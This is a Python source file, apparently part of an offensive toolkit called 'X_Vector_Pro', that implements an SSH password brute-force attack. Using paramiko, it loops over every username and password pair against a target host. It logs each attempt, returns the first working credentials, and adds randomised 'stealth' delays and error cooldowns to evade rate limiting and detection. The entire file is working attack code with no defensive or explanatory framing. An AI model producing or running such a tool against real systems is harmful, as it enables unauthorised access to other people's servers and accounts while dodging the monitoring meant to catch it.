# X_Vector_Pro/core/brute_force/ssh_brute.py
import os
import customtkinter 
import paramiko
import socket
import time
import random
from utils.logger import log_event

def ssh_brute_force(target_ip, port, username_list, password_list, timeout=5, delay_range=(0.5, 2.5)):
    log_event("SSH Brute Force started on target: {}".format(target_ip))

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    success = []
    attempts = 0

    for username in username_list:
        for password in password_list:
            attempts += 1
            try:
                log_event(f"Trying {username}:{password} on {target_ip}")
                client.connect(
                    hostname=target_ip,
                    port=port,
                    username=username,
                    password=password,
                    timeout=timeout,
                    banner_timeout=timeout,
                    auth_timeout=timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
                log_event(f"SUCCESS: {username}:{password} on {target_ip}")
                success.append((username, password))
                client.close()
                return success  # Stop after first success if desired

            except paramiko.AuthenticationException:
                pass  # Failed attempt, move to next

            except (paramiko.SSHException, socket.error, socket.timeout) as e:
                log_event(f"Connection error: {str(e)}")
                time.sleep(random.uniform(2, 5))  # Cooldown on error
                continue

            finally:
                delay = random.uniform(*delay_range)
                time.sleep(delay)  # Stealth delay

    log_event(f"Brute force completed with {attempts} attempts.")
    return success
